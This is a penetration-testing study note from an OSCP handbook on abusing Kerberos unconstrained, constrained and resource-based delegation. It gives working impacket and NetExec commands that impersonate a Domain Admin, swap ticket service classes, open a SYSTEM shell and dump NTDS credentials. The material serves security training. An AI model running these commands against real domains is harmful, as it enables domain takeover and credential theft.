---
title: "Kerberos Delegation"
slug: kerberos-delegation
category: notes
handbook: oscp
tags: ["kerberos"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "Delegation lets a service act on behalf of a user to reach a second service (the Kerberos \"double hop\")."
---
Delegation lets a service act on behalf of a user to reach a second service (the Kerberos "double hop"). Misconfigured, it becomes an impersonation primitive: a controlled account can request a service ticket as any user, including a Domain Admin. It is a real technique but an uncommon OSCP path (more HTB/CRTP territory), and the ticket handling below goes beyond what the exam AD set usually needs. Concept detail is in [Active Directory Concepts](/collections/oscp/active-directory-concepts).

## The three types

- **Unconstrained:** the service can impersonate a user to anything. The user's TGT is cached on that host, so compromising the host lets a privileged user's TGT be stolen (a DA logon there is domain compromise). DCs have this by default.
- **Constrained:** the account can impersonate a user, but only to a fixed list of services (`msDS-AllowedToDelegateTo`). Abusable when that account's credentials are known.
- **Resource-based (RBCD):** the target resource lists who may delegate to it (`msDS-AllowedToActOnBehalfOfOtherIdentity`). Abusable with write access over that attribute (GenericWrite/GenericAll on the target).

## Find it

Delegation is discovered, not guessed, it is just an LDAP attribute.

```bash
impacket-findDelegation DOMAIN/user:pass -dc-ip <DC_IP>
```

The table gives each account, its delegation type, and the target SPNs (`DelegationRightsTo`). BloodHound draws the same as an `AllowedToDelegate` edge.

## Abuse constrained delegation

With the delegating account's password or hash, `impacket-getST` runs the S4U2Self + S4U2Proxy exchange and returns a service ticket for the target, impersonating a named user:

```bash
impacket-getST -spn '<allowed SPN>' -impersonate 'Administrator' -dc-ip <DC_IP> 'DOMAIN/deleg_user:password'
export KRB5CCNAME=$(ls -t *.ccache | head -1)
```

`-impersonate` names the user to become (a Domain Admin). "Constrained w/ Protocol Transition" is the easy case (any user can be impersonated); without protocol transition it is harder.

**The `-altservice` trick:** the service class in the final ticket is not bound to the allowed SPN, because the ticket is encrypted with the target computer's key and the machine honours it for any of its own services. So delegation to one service (`HTTP/dc`) can be swapped to `cifs` (SMB, remote exec, and the VSS/DRSUAPI ntds dump), `host`, or `ldap`. Pick the class the intended action runs over: DCSync and the VSS `ntds` dump both go over SMB, so they need the `cifs` ticket, not `ldap`; an `ldap` ticket buys LDAP writes instead (RBCD, shadow credentials, group membership). Delegation to a single service on a DC therefore means full control of that DC, whichever class it was granted for.

```bash
impacket-getST -spn 'HTTP/dc.corp.com' -impersonate Administrator -altservice cifs -dc-ip <DC_IP> 'corp.com/user:pass'
```

## Use the ticket

Point `KRB5CCNAME` at the `.ccache` and authenticate with `-k`:

```bash
impacket-psexec -k -no-pass DOMAIN/Administrator@dc.corp.com               # SYSTEM shell (cifs ticket)
impacket-secretsdump -k -no-pass -use-vss DOMAIN/Administrator@dc.corp.com  # dump ntds over SMB
nxc smb dc.corp.com --use-kcache --ntds                                    # same via NetExec
```

impacket over Kerberos is finicky: it needs the target as an FQDN matching the ticket's SPN, usually `-dc-ip`, and a working `/etc/krb5.conf` mapping the realm to its KDC. Mismatches surface as `KRB_AP_ERR_MODIFIED` (the service could not decrypt the ticket) or `STATUS_MORE_PROCESSING_REQUIRED` (auth fell back to NTLM and failed). Reaching a DC on the exam is usually simpler, a Domain Admin credential straight into [DCSync](/collections/oscp/dcsync) or pass-the-hash, no tickets involved.
